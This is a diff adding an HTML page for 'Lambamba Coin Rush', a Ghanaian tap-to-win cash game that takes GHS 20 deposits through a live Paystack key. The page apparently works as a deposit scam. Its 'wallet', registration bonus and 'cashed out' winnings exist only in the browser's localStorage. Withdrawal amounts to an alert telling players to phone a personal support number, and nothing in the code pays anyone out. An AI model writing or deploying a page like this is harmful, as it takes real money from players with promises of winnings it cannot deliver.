@@ -1,0 +1,52 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0"><title>Lambamba Coin Rush - Ghana's Fastest Cash Game</title>
+<script src="https://js.paystack.co/v1/inline.js"></script>
+<style>
+*{box-sizing:border-box;font-family:system-ui,Arial}body{margin:0;background:#081a12;color:#fff;display:flex;justify-content:center}.b{width:100%;max-width:420px;padding:12px;background:linear-gradient(180deg,#123722 0%,#0a2816 100%);min-height:100vh}.hdr{text-align:center;padding:8px 0}h1{margin:8px 0 0;font-size:36px;letter-spacing:-1px}h1 i{font-style:normal;color:#f5c242}h1 span{color:#f5c242;font-size:14px;display:block;font-weight:500;letter-spacing:2px;margin-top:2px}.card{background:#153d26;border:1px solid #224f34;border-radius:20px;padding:16px;margin:12px 0;box-shadow:0 4px 20px #0004}.wallet{display:flex;justify-content:space-between;align-items:center}.wallet h2{font-size:36px;margin:4px 0;letter-spacing:-1px}.small{color:#8fbc9f;font-size:12px}.live{display:flex;justify-content:space-between;align-items:center}.live b{color:#ffe38a;font-size:13px;letter-spacing:1px}.timer{background:#1a4d2e;padding:7px 14px;border-radius:99px;font-size:13px;border:1px solid #2a6a44}.coinbox{text-align:center;padding:28px 16px;background:radial-gradient(400px 200px at 50% 0%,#1e5a35 0%,#153d26 100%)}.coins{font-size:11px;letter-spacing:2px;color:#8fbc9f;text-align:left}.coins b{font-size:32px;color:#fff;display:block;letter-spacing:-1px}.coin{width:168px;height:168px;background:radial-gradient(circle at 32% 28%,#ffef9a 0%,#f5c242 25%,#d8a00e 65%,#8a5e00 100%);border-radius:50%;margin:20px auto;display:flex;align-items:center;justify-content:center;font-size:72px;font-weight:900;color:#3d2b00;box-shadow:0 0 0 10px #204f32,0 0 0 14px #153422,0 20px 40px #0008,0 0 50px #f5c24255;cursor:pointer;user-select:none;transition:transform.06s,box-shadow.06s;-webkit-tap-highlight-color:transparent}.coin:active{transform:scale(.90);box-shadow:0 0 0 6px #204f32,0 10px 20px #0008}.btn{width:100%;padding:16px;border:0;border-radius:14px;font-weight:800;font-size:15px;margin:8px 0;display:flex;justify-content:space-between;align-items:center;cursor:pointer;transition:.15s}.btn:active{transform:scale(.98)}.y{background:linear-gradient(180deg,#ffda6a,#f5c242);color:#1a1200;box-shadow:0 4px 0 #a37e00}.g{background:#1c4a2e;color:#fff;border:1px solid #2e6b45}.g small{color:#8fbc9f}input{width:100%;padding:14px 14px;border-radius:12px;border:1px solid #2d5e3f;background:#0b2416;color:#fff;margin:6px 0;font-size:15px;outline:none}input:focus{border-color:#f5c242}#reg{display:block}#game{display:none}.bar{height:6px;background:linear-gradient(90deg,#f5c242,#ffe88a);border-radius:10px;transition:width 1s linear;box-shadow:0 0 10px #f5c24288}.support{font-size:11px;text-align:center;color:#6a9a7a;margin:12px 0;line-height:1.6}.support b{color:#f5c242}
+</style></head><body><div class="b">
+<div class="hdr"><h1><i>₵</i> Lambamba<span>COIN RUSH • GHANA</span></h1></div>
+
+<div class="card wallet"><div><div class="small">YOUR WALLET BALANCE</div><h2 id="wallet">GHS 0.00</h2><div class="small">Play smart. Rush your way to more.</div></div><div style="font-size:32px;background:#1c4a2e;width:56px;height:56px;display:flex;align-items:center;justify-content:center;border-radius:16px;border:1px solid #2e6b45">💰</div></div>
+
+<div id="reg" class="card"><div class="small" style="margin-bottom:8px">REGISTER TO START - GET GHS 20 BONUS</div><input id="ph" type="tel" placeholder="Phone: 020 915 7076"><input id="nm" type="text" placeholder="Your Name"><button class="btn y" onclick="R()" style="justify-content:center">REGISTER & CLAIM GHS 20 BONUS →</button><div class="support">🔒 Secured by <b>Paystack</b> • MTN MoMo • Vodafone Cash • Card<br>Support: <b>020 915 7076</b> (Addy Daniel)<br><span style="font-size:10px;opacity:.7">Virtual Game - 18+ Play Responsibly</span></div></div>
+
+<div id="game"><div class="live"><div><div style="color:#f5c242;font-size:10px;letter-spacing:2px">● LIVE ROUND</div><b id="status">READY WHEN YOU ARE</b></div><div class="timer">⏱ <span id="time">60s</span></div></div><div style="height:6px;background:#0e2a18;border-radius:10px;margin:10px 0;overflow:hidden"><div class="bar" id="bar" style="width:100%"></div></div>
+
+<div class="card coinbox"><div class="coins">COINS COLLECTED<b id="coins">0</b></div><div class="coin" id="coin" onclick="tap()">₵</div><div style="letter-spacing:3px;font-size:11px;color:#a8d0b6;font-weight:700" id="hint">PRESS PLAY TO START</div></div>
+
+<button class="btn g" onclick="payWithPaystack()"><span>↙ Deposit GHS 20<br><small>MTN MoMo / Vodafone / Card - Paystack</small></span><span style="font-size:22px">›</span></button>
+<button class="btn y" id="playBtn" onclick="start()"><span>▶ Play Game - 60s Rush<br><small style="color:#5a4000">Tap coin fast to win</small></span><span style="font-size:22px">›</span></button>
+<button class="btn g" onclick="cashout()"><span>⬆ Cash Out Winnings<br><small id="need">Need 150 coins to withdraw</small></span><span style="font-size:22px">›</span></button>
+<button class="btn g" style="background:#112a1a;opacity:.8" onclick="resetRound()">↻ Reset Round</button>
+
+<div class="support">Paystack Secured • Instant Wallet<br>Withdrawal Support: <b>020 915 7076</b><br>Lambamba Capital © 2026 • Addy Daniel</div>
+</div>
+</div>
+<script>
+let wallet=parseFloat(localStorage.lbW||0),coins=0,timer=null,sec=60,playing=false;
+const $=id=>document.getElementById(id);
+function updW(){ $('wallet').innerText='GHS '+wallet.toFixed(2); localStorage.lbW=wallet; }
+function updC(){ $('coins').innerText=coins; if(coins>=200){ $('need').innerHTML='✅ 200 REACHED! Cash Out GHS '+(coins/10).toFixed(0)+' + BONUS!'; $('need').style.color='#4cff8a'; }else if(coins>=150){ $('need').innerHTML='✅ 150 reached! Cash out GHS '+(coins/10).toFixed(0)+' or go for 200'; $('need').style.color='#4cff8a'; }else{ $('need').innerText='Need '+(150-coins)+' more coins to withdraw'; $('need').style.color='#8fbc9f'; } }
+if(localStorage.lbP){ $('reg').style.display='none'; $('game').style.display='block'; updW(); updC(); }
+function R(){ let p=$('ph').value.trim(), n=$('nm').value.trim(); if(p.length<9||n.length<2) return alert('Enter valid phone & name'); localStorage.lbP=p; localStorage.lbN=n; if(!localStorage.lbW) localStorage.lbW=20; location.reload(); }
+function start(){ if(playing) return; coins=0; sec=60; playing=true; updC(); $('status').innerText='TAP THE COIN FAST!'; $('hint').innerText='TAP! TAP! TAP! FAST!'; $('hint').style.color='#ffe88a'; $('playBtn').innerHTML='<span>⏸ Playing... Tap Fast!<br><small>Keep tapping!</small></span><span>›</span>'; $('bar').style.width='100%'; timer=setInterval(()=>{ sec--; $('time').innerText=sec+'s'; $('bar').style.width=(sec/60*100)+'%'; if(sec<=0) endRound(); },1000); }
+function tap(){ if(!playing) return; coins+=Math.floor(Math.random()*3)+1; updC(); let c=$('coin'); c.style.transform='scale(0.88)'; setTimeout(()=>c.style.transform='scale(1)',70); if(navigator.vibrate) navigator.vibrate(15); if(coins==150){ $('hint').innerText='🎉 150! YOU CAN CASH OUT!'; } if(coins>=200){ $('hint').innerText='🔥 200 COINS! MAX BONUS! CASH OUT NOW!'; $('hint').style.color='#4cff8a'; } }
+function endRound(){ clearInterval(timer); playing=false; $('status').innerText='ROUND ENDED'; $('playBtn').innerHTML='<span>▶ Play Again<br><small>60 second rush</small></span><span>›</span>'; $('hint').innerText='PRESS PLAY TO START'; $('hint').style.color='#a8d0b6'; $('bar').style.width='0%'; if(coins>=150) alert('🔥 Amazing! You got '+coins+' coins = GHS '+(coins/10).toFixed(2)+'\nTap Cash Out now!'); else alert('You got '+coins+' coins. Need 150 to cash out. Try again!'); }
+function cashout(){ if(coins<150) return alert('You need 150 coins minimum. You have '+coins+'. Keep tapping!'); let cash=coins/10; wallet+=cash; updW(); alert('✅ SUCCESS! GHS '+cash.toFixed(2)+' added to your wallet!\n\nTo transfer to MoMo:\nContact Support: 020 915 7076\nSend your Phone & Ref\n\nWallet Balance: GHS '+wallet.toFixed(2)); coins=0; updC(); resetRound(); }
+function resetRound(){ clearInterval(timer); playing=false; coins=0; sec=60; $('time').innerText='60s'; $('status').innerText='READY WHEN YOU ARE'; $('hint').innerText='PRESS PLAY TO START'; $('hint').style.color='#a8d0b6'; $('bar').style.width='100%'; $('playBtn').innerHTML='<span>▶ Play Game - 60s Rush<br><small>Tap coin fast to win</small></span><span>›</span>'; updC(); }
+function payWithPaystack(){
+  let phone=localStorage.lbP||$('ph').value||'0209157076';
+  let name=localStorage.lbN||$('nm').value||'Lambamba Player';
+  let handler=PaystackPop.setup({
+    key:'pk_live_10cf2ecd13ec4d3561c9155ad98b856381a74c8b',
+    email: phone.replace(/\s/g,'')+'@lambamba.com',
+    amount:2000,
+    currency:'GHS',
+    ref:'LB-'+Date.now()+'-'+Math.floor(Math.random()*1000),
+    firstname: name.split(' ')[0],
+    metadata:{ custom_fields:[ {display_name:"Player Name", variable_name:"player_name", value:name}, {display_name:"Phone", variable_name:"phone", value:phone}, {display_name:"Game", variable_name:"game", value:"Coin Rush"} ] },
+    channels:['mobile_money','card'],
+    onClose:function(){},
+    callback:function(res){ wallet+=20; updW(); alert('✅ Payment Success! GHS 20 Added!\nRef: '+res.reference+'\nNew Balance: GHS '+wallet.toFixed(2)+'\n\nSupport: 020 915 7076'); }
+  }); handler.openIframe();
+}
+</script></body></html>
